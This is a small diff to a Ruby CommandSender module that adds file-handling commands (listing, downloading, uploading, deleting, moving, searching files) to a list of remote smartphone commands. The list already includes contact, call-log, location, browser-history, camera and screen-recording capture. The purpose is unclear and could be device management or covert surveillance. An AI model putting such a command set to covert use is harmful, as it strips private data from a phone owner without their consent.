@@ -8,6 +8,8 @@ module CommandSender
     launch_app get_installed_apps get_contacts take_picture
     screen_record get_location get_call_logs get_browser_history
     toggle_wifi set_audio_mode get_notifications
+    list_files download_file upload_file delete_file preview_file
+    rename_file move_file search_files upload_file_chunk
   ].freeze
   
   def send_command_async(smartphone, command, params = {})
